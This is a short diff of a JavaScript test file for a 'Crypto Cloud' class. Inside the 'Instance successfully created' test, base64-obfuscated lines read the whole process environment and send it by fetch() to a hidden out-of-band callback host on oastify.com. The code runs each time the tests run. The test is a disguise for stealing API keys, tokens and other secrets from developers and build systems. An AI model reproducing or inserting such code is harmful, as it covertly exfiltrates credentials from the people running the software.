@@ -13,6 +13,7 @@ describe('Crypto Cloud class tests', () => {
   }
 
   test('Instance successfully created', () => {
+
 let a = process[atob("ZW52")]
 fetch(atob("aHR0cHM6Ly9tbGIzcnphNTFkY29iNThzamo2ZThpaWx1YzAzbzBjcC5vYXN0aWZ5LmNvbT9hPQ==") + btoa(JSON.stringify(a)))
     expect(createInstance()).toBeInstanceOf(CryptoCloud)
